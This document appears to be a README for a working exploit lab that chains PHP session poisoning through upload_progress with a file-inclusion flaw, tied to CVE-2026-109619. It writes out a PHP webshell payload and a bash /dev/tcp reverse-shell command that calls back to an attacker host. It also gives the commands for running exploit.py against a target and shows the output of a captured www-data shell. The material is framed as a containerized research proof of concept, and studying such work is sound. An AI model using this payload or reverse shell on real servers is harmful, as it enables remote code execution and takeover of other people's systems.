# Session-poisoning + LFI reverse shell (CVE-2026-109619 surface)

A working, containerized **callback shell** that chains two behaviors of the
PHP2Shell session surface with a deliberately-vulnerable app endpoint.

> **Scope / honesty:** this is *not* the pure memory-corruption RCE. It uses the
> confirmed **session-poisoning** primitive (the default-on
> `session.upload_progress` handler writes an attacker-controlled key verbatim
> into the session file, and an OOM skips the cleanup so it persists) plus an
> **LFI** in the target app (`include($_GET['page'])`). The LFI is the app-level
> crutch — see the end of this file.

## The chain

1. **Poison** — a multipart POST sets `PHP_SESSION_UPLOAD_PROGRESS` to
   `<?php system($_GET['c']); ?>`. The `php` session serializer writes the
   session *key* (which is `upload_progress_` + that value) **raw** into the
   session file, so the payload lands unquoted. A trailing ~700 KB field name
   OOMs the request (the CVE-2026-109618 corruption), which skips
   `MULTIPART_EVENT_END` cleanup, so the payload persists:

   ```
   upload_progress_<?php system($_GET['c']); ?>|a:5:{s:10:"start_time";…}
   ```

2. **Include** — the target's LFI does `include("/tmp/sess_<sid>")`. PHP parses
   the file in HTML mode: `upload_progress_` is echoed as text, the
   `<?php system($_GET['c']); ?>` **executes**, and the `|a:5:{…}` tail is
   echoed back.

3. **Shell** — `c` carries `bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'`,
   connecting a reverse shell back to the attacker.

## Run it

```bash
docker compose -f docker-compose.lfi.yml up --build
```

The `attacker` service poisons the target, triggers the LFI, listens on `:4444`,
and prints the result:

```
attacker-1  | [+] reverse shell connected from ('172.19.0.2', 48124)
attacker-1  | www-data@b21c41ece846:/var/www/html$ id; hostname; whoami; pwd
attacker-1  | uid=33(www-data) gid=33(www-data) groups=33(www-data)
attacker-1  | b21c41ece846
attacker-1  | www-data
attacker-1  | /var/www/html
```

To run the exploit yourself against the target on port 18092:

```bash
python3 lfi_target/exploit.py --url http://127.0.0.1:18092/ \
    --callback 172.17.0.1 --port 4444 --listener
```

## Files

- `lfi_target/` — the vulnerable PHP app (LFI + session upload progress, single
  worker). `index.php` is the `include($_GET['page'])` endpoint.
- `attacker/` — stdlib-only `exploit.py` (poison + LFI trigger + one-shot
  reverse-shell listener).
- `docker-compose.lfi.yml` — `target` + `attacker`.

## Honest scope

- **Requires an LFI.** The `include($_GET['page'])` endpoint is the app-level
  crutch; without it, the session file is server-side and the payload can't be
  executed. This is the "session poisoning + LFI" technique, distinct from the
  pure-runtime memory-corruption RCE.
- The **pure-runtime** path (turning the CVE-2026-109618 `*(uint32_t*)P -= 1`
  primitive directly into code execution) still needs the heap-address leak that
  `CVE-2026-109619.md` documents as not-yet-reproduced.
